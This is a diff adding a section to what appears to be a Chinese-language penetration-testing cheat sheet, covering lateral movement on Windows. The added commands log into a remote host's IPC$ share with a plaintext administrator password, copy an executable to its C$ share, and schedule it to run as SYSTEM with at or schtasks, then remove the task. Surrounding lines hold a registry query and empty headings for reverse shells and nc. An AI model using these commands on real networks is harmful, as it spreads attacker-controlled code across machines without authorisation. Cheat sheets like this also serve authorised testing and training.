@@ -496,6 +496,30 @@ Reg query “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server
 
 ```
 
+## at&schtasks横向
+
+使用明文密码登录到目标，需要135端口开启：
+```
+Net use \\192.168.2.148\ipc$ password /user:test\administrator
+
+复制文件
+copy c:\1.exe \\192.168.2.148\c$
+
+at新建10:10分运行的定时作业
+at \\192.168.2.148 10:10 c:\1.exe
+
+Windows server 2012及以上使用schtasks命令
+Schtasks /create /s 192.168.2.148 /ru “SYSTEM” /tn executefile /sc DAILY /tr c:/1.exe /F
+Schtasks /run /s 192.168.2.148 /tn executefile /i
+Schtasks /delete /s 192.168.2.148 /tn executefile /f
+```
+
+
+
+
+
+
+
 ## 反弹shell
 
 ## nc
